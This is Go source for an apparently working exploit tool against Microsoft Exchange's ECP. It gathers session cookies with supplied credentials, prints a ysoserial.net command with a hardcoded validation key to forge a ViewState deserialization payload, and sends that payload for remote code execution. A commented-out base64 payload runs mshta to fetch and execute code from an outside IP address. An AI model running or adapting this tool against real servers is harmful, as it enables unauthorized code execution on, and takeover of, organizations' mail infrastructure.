package main

import(
	"fmt"
	"net/http"
	"crypto/tls"
	"strings"
	"io/ioutil"
	"io"
	"os"
	"log"
	"net/url"
	"flag"
	"time"
)


func main(){
    scanCommand := flag.NewFlagSet("scan", flag.ExitOnError)
    hostFlag := scanCommand.String("t", "", "Flag to specify the target Exchange host.")
    domainFlag := scanCommand.String("d", "", "Flag to specify the internal domain name (NETBIOS or FQDN) for the Exchange host.")
    usernameFlag := scanCommand.String("u", "", "Flag to specify the domain user to use when authenticating to the Exchange host.")
    passwordFlag := scanCommand.String("p", "", "Flag to specify the domain password to use when authenticating to the Exchange host.")


    generateCommand := flag.NewFlagSet("generate", flag.ExitOnError)
    cookieFlag := generateCommand.String("s", "", "ASP.NET_SessionId cookie value")
    executeFlag := generateCommand.String("c","","Command to execute upon successful exploitation")

    exploitCommand := flag.NewFlagSet("exploit", flag.ExitOnError)
    host2Flag := exploitCommand.String("t", "", "Flag to specify the target Exchange host.")
    cookiesFilenameFlag := exploitCommand.String("c", "", "Flag to specify filename of cookies required for ECP auth. Dumped via the scan command.")
    payloadFilenameFlag := exploitCommand.String("p", "", "Flag to specify the filename of the payload. To generate the payload, use ysoserial along with the generate command.")

    
    if len(os.Args) <= 2 {
        fmt.Println("\nscan - Scan an Exchange host and obtain cookies needed for exploitation:")
        fmt.Println("./ecp_slap scan -t 10.1.1.5 -d corp.local -u admin -p badpassword ")
        fmt.Println("./ecp_slap scan -t mail.corp.com -d CORP -u admin -p badpassword \n")
        fmt.Println("generate - Generate the ysoserial.net command for payload creation:")
        fmt.Println("./ecp_slap generate -s [ASP.NET_SessionId] -c [COMMAND]")
        fmt.Println("./ecp_slap generate -s 81c35474-6a73-4a1c-af45-b3985e7d7ad1 -c \"echo test > C:/temp/test.txt\"\n")
        fmt.Println("exploit - Exploitation of a vulnerable Exchange server:")
        fmt.Println("./ecp_slap exploit -t 192.168.5.22 -c cookies.txt -p payload.txt")
        fmt.Println("./ecp_slap exploit -t mail.corp.com -c cookies.txt -p payload.txt")
        return
    }

    switch os.Args[1] {
        case "scan":
            scanCommand.Parse(os.Args[2:])
        case "generate":
            generateCommand.Parse(os.Args[2:])
        case "exploit":
            exploitCommand.Parse(os.Args[2:])
        default:
            fmt.Printf("%q is not valid command.\n",os.Args[1])
            os.Exit(2)
    }

    if scanCommand.Parsed(){
        checkExchange(*hostFlag)
        cookiesOWA := authToOWA(*hostFlag, *domainFlag, *usernameFlag, *passwordFlag)
        if cookiesOWA != ""{
        	allCookies := authToECPwithCookies(*hostFlag,cookiesOWA)
        	WriteToFile("cookies.txt", allCookies)
        } else{
        	cookiesECP := authToECP(*hostFlag, *domainFlag, *usernameFlag, *passwordFlag)
        	allCookies := authToECPwithCookies(*hostFlag,cookiesECP)
        	WriteToFile("cookies.txt", allCookies)
        }
        
    }

    if generateCommand.Parsed(){
        generate(*cookieFlag, *executeFlag)
    }

    if exploitCommand.Parsed(){
        viewstateRaw := ReadFromFile(*payloadFilenameFlag)
        cookiesNeeded := ReadFromFile(*cookiesFilenameFlag)
        exploit(*host2Flag, cookiesNeeded, viewstateRaw)
    }
	
	//cookiesOWA := authToOWA()
	//allCookies := authToECPwithCookies(cookiesOWA)
	//WriteToFile("cookies.txt", allCookies)
	//cookiesNeeded := ReadFromFile("cookies.txt")
	//payload := ReadFromFile("viewstate.txt")
	//exploit(cookiesNeeded, payload)

}

func exploit(targetHost string, cookiesNeeded string, viewstateRaw string){
   
   //viewstateRaw := "/wEytAcAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADWBTw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBtc2h0YSBodHRwOi8vMTkyLjE2OC4xNTAuMTAzLz9yPUVYRUNVVEVEIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsM4jxP6ALj7rw3fX3Bb2bLUIUvMA=="
    viewstate := url.QueryEscape(viewstateRaw)
   tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}
    fullURI := "https://"+targetHost+"/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE="+viewstate
    //fmt.Println(fullURI)

    ecpReq, err := http.NewRequest("GET", fullURI, strings.NewReader(""))
    ecpReq.Header.Set("Cookie", cookiesNeeded) 
    resp,err := client.Do(ecpReq)

    if err != nil {
        log.Fatal(err)
    }
    
    if resp.StatusCode == 500{
    	fmt.Println("\n\n[+] Expected response recieved from Exchange server - check if code execution worked!")
    }else{
    	fmt.Println("\n\n[!] Unexpected response code from Exchange server")
    }
}


func authToECPwithCookies(targetHost string, cookiesOWA string) string{
	
	fmt.Println("[i] Attempting authentication to ECP with previously obtained cookies...")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout: 15 * time.Second,
	}

	req, err := http.NewRequest("GET", "https://"+targetHost+"/ecp/default.aspx", nil)
	if err != nil {
		fmt.Println("err")
	}
	req.Host = targetHost
	req.Header.Set("Connection", "close")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edge/84.0.522.40")
	req.Header.Set("Cookie", cookiesOWA)

	resp, err := client.Do(req)
	if err != nil {
		// handle err
	}
	defer resp.Body.Close()
	
	
	
	
	//parse ASP.NET session cookie
	
	
	
	aspnetSessionId := ""
	for _, cookie := range resp.Header["Set-Cookie"] {
		cookieSlice := strings.Split(cookie,";")
		if strings.Contains(cookieSlice[0], "ASP.NET_SessionId"){
			aspnetSessionId = cookieSlice[0] 
		}
	}
	if aspnetSessionId != ""{
		fmt.Println("[i] Authentication to ECP for additional cookie - successful")
		fmt.Println("[+++] " + aspnetSessionId)
	}else{
		fmt.Println("[!] Authentication to ECP did NOT contain appropriate cookie in response\n")
		os.Exit(1)
	}
	allCookies := cookiesOWA + aspnetSessionId
	
	
	//Check for viewstategenerator value B97B4E27
	
	body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            log.Fatal(err)
        }
        
        
        if strings.Contains(string(body), "B97B4E27"){
            fmt.Println("[+++] Appropriate __viewstategenerator value identified in response")

         } else{
            fmt.Println("[!] Appropriate __viewstategenerator was NOT identified in the response. Maybe patched?")
         }
	

	return allCookies
}



func authToECP(targetHost string, targetDomain string, username string, password string) string{
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
	}

	body := strings.NewReader("destination=https://"+targetHost+"/ecp/&flags=4&username="+targetDomain+"%5C"+username+"&password="+password+"")
	req, err := http.NewRequest("POST", "https://"+targetHost+"/owa/auth.owa", body)
	if err != nil {
		// handle err
	}
	req.Host = targetHost
	req.Header.Set("Connection", "close")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edge/84.0.522.40")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		// handle err
	}
	defer resp.Body.Close()
	
	//fmt.Println(resp.Header["Set-Cookie"])
	//bodyResp, err := ioutil.ReadAll(resp.Body)
	//if err != nil {
	//	log.Fatal(err)
	//}
	//fmt.Println(string(bodyResp))
	//fmt.Println("\n")
	
	stringOfCookies := ""
	for _, cookie := range resp.Header["Set-Cookie"] {
		cookieSlice := strings.Split(cookie,";")
		stringOfCookies += cookieSlice[0]+";"
	}
	if strings.Contains(stringOfCookies, "cadata"){
		fmt.Println("[i] Authentication to ECP in place of OWA - successful - cookies obtained")
	}else{
		fmt.Println("[!] Authentication to ECP was NOT successful, check authentication manually")
		//os.Exit(1)
	}
	//fmt.Println(stringOfCookies)
	return stringOfCookies
}


func authToOWA(targetHost string, targetDomain string, username string, password string) string{
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
	}

	body := strings.NewReader("destination=https://"+targetHost+"/owa/&flags=4&username="+targetDomain+"%5C"+username+"&password="+password+"")
	req, err := http.NewRequest("POST", "https://"+targetHost+"/owa/auth.owa", body)
	if err != nil {
		// handle err
	}
	req.Host = targetHost
	req.Header.Set("Connection", "close")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 Edge/84.0.522.40")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		// handle err
	}
	defer resp.Body.Close()
	
	//fmt.Println(resp.Header["Set-Cookie"])
	//bodyResp, err := ioutil.ReadAll(resp.Body)
	//if err != nil {
	//	log.Fatal(err)
	//}
	//fmt.Println(string(bodyResp))
	//fmt.Println("\n")
	
	stringOfCookies := ""
	for _, cookie := range resp.Header["Set-Cookie"] {
		cookieSlice := strings.Split(cookie,";")
		stringOfCookies += cookieSlice[0]+";"
	}
	if strings.Contains(stringOfCookies, "cadata"){
		fmt.Println("[+] Authentication to OWA was successful - cookies obtained")
	}else{
		fmt.Println("[!] Authentication to OWA was NOT successful, check authentication manually")
		//os.Exit(1)
	}
	//fmt.Println(stringOfCookies)
	return stringOfCookies
}

func checkExchange(targetHost string){
    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    clientOne := &http.Client{Transport: tr}

    autodiscoverReq, err := http.NewRequest("GET", "https://"+targetHost+"/autodiscover/autodiscover.xml", nil)
    if err != nil {
        // handle err
    }
    autodiscoverReq.Header.Set("Connection", "close")

    autodiscoverResp, err := clientOne.Do(autodiscoverReq)
    if err != nil {
        fmt.Println("[-] Error occurred when attempted to identify Autodiscover as on-prem Exchange identifier.")
    } else{
        defer autodiscoverResp.Body.Close()
        if autodiscoverResp.StatusCode == 401{
		fmt.Println("[i] Autdiscover service associated with on-prem Exchange idenitified ")
	} else{
		fmt.Print("[?] Autdiscover responded, but with an unexpected response code: ")
		fmt.Println(autodiscoverResp.StatusCode)
		
	}
    }
}


func generate(cookie string, command string){
    //fmt.Println("Based on the information provided:")
    fmt.Println("\n\nysoserial.exe -p ViewState -g TextFormattingRunProperties -c \""+command+"\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\""+cookie+"\" --isdebug --islegacy")
}

func WriteToFile(filename string, data string) error {
    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    _, err = io.WriteString(file, data)
    if err != nil {
        return err
    }
    fmt.Println("[i] All authentication cookies required for exploitation written to: " + filename)
    fmt.Println("")
    return file.Sync()
}

func ReadFromFile(filename string) string{
    //data := ""
    data, err := ioutil.ReadFile(filename)
    if err != nil {
        fmt.Println("File reading error", err)
    }
    //fmt.Println("Contents of file:", string(data))
    return string(data)
}
